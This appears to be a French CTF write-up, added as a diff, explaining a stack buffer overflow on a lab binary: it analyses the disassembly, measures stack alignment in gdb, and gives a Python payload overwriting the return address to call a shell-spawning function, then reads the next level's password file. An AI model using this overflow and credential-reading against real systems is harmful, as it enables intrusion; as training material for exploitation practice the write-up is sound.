@@ -1,0 +1,63 @@
+Ici en faisant objdump on peut voir qu'il y a la fonction main ainsi que la fonction run.
+
+On recree donc l'algo en c.
+
+Petites subtilités lorsqu'on crée la variable str le lea prend en compte l'esp a offset +16
+ce qui nous donne un buffer de 64 octets;
+(
+   0x08048486 <+6>:     sub    esp,0x50
+   0x08048489 <+9>:     lea    eax,[esp+0x10]
+)
+il ne faut pas oublier de prendre en compte
+    0x08048483 <+3>:     and    $0xfffffff0,%esp
+
+qui correspond à un alignement sur 16 bits
+
+
+En faisant des recherches on peut voir que gets peut etre exploité avec un buffer static.
+
+L'idée est donc de surcharger la mémoire pour acceder et executer la fonction run qui elle lance un
+nouvel environement.
+
+Pour ce faire nous alonrs lui passer en parametre une string qui nous permet de lancer la fonction run.
+
+Pour cela on vas utliser le shellcode de l'adresse de la fonction :
+   0x08048444 = \x44\x84\x04\x08
+
+La return adresse est l'adresse de la fonction à laquelle l'execution doit reprendre une fois le main terminé.
+
+Notre objectif est donc d'y acceder afin de la modifier.
+
+Cette adresse se trouve sur la stack juste avant la sauvegarde de l'epb.
+
+On prend aussi en compte l'alignement qui a été effecuté juste avant l'allocation des 80 octets.
+
+En ce qui concerne l'alignement nous pouvons le trouver en mettant un breakpoint avant et après l'instruction 
+de l'alignement.
+                               #dans gdb#
+    breakpoint avant alignement
+    {
+            b *0x08048483
+            run
+            print $esp
+    }   
+    ce qui nous donne [$1 = (void *) 0xbffff738]
+
+    breakpoint après alignement
+    {
+            b *0x08048486
+            continue (car le premier breakpoint est sur 0x08048483)
+            print $esp
+    }   
+    ce qui nous donne [$1 = (void *) 0xbffff730]
+
+On additionne donc le tout avant d'ecrire (en shellcode) l'adresse de la fonction run.
+    buffer [64] + alignement [8] + push ebp [4] = 76
+
+on vas donc generer un fichier qui contient les infos désirées:
+    dans un premier temps nous avons 
+    python -c 'print "A" * 76 + "\x44\x84\x04\x08"'
+
+ce qui nous lance bien un nouvel environement.
+
+cat /home/user/level2/.pass (pour avoir le password)
